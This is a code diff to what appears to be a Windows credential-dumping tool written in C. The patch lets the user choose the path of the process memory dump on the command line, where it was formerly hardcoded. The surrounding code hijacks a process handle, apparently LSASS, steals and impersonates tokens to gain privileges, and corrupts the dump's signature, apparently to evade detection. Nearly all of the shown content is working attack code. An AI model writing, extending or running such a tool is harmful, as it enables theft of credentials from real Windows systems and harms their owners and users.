@@ -726,7 +726,7 @@ VOID GenerateInvalidSignature(LPVOID dumpBuffer) {
     }
 }
 
-BOOL InvokeMiniDump(HANDLE hProcess) {
+BOOL InvokeMiniDump(HANDLE hProcess, LPCWSTR filePathArg) {
     BOOL isDumped = FALSE;
 
     dumpBufferSize = FindBufferSize(hProcess);
@@ -761,14 +761,7 @@ BOOL InvokeMiniDump(HANDLE hProcess) {
 
     if (isDumped) {
         GenerateInvalidSignature(dumpBuffer);
-        LPCWSTR filePath = L"C:\\temp\\debug.dmdp";
-        DWORD fileAttributes = GetFileAttributesW(L"C:\\temp");
-        if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
-            if (!CreateDirectoryW(L"C:\\temp", NULL)) {
-                printf("Create C:\\temp first\n");
-                return 1;
-            }
-        }
+        LPCWSTR filePath = filePathArg;
         HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         DWORD bytesWritten = 0;
         BOOL writeSuccess = WriteFile(hFile, dumpBuffer, bytesRead, &bytesWritten, NULL);
@@ -785,10 +778,28 @@ BOOL InvokeMiniDump(HANDLE hProcess) {
     return isDumped;
 }
 
-int main() {
+int main(int argc, char* argv[]) {
     if (!YouMustBeThisTallToRide()) {
         printf("[!] Currently not running as an Administrator!");
         exit(11);
+    }
+
+    // converting cmdline arg[1] to LPCWSTR to be consumed by InvokeMiniDump()
+    LPCWSTR filePath = NULL;
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, NULL, 0);
+    if (size_needed > 0) {
+        filePath = (LPCWSTR)malloc(size_needed * sizeof(wchar_t));
+        if (filePath != NULL) {
+            MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, (LPWSTR)filePath, size_needed);
+        }
+        else {
+            printf("[!] Memory allocation failed!");
+            exit(2);
+        }
+    }
+    else {
+        printf("[!] Conversion of file path failed!");
+        exit(3);
     }
 
     printf("PID: %i\n", GetProcessId(NtCurrentProcess()));
@@ -809,12 +820,14 @@ int main() {
     hToken = FindersKeepers(luid);
     if (GetPromoted(hToken)) {
         hProcess = HijackHandle(elsauce);
-        InvokeMiniDump(hProcess);
+        InvokeMiniDump(hProcess, filePath);
         GetDemoted();
     }
 
     if (hToken) CloseHandle(hToken);
     if (hProcess) CloseHandle(hProcess);
+
+    free((LPVOID)filePath);
 
     system("pause");
     return 0;
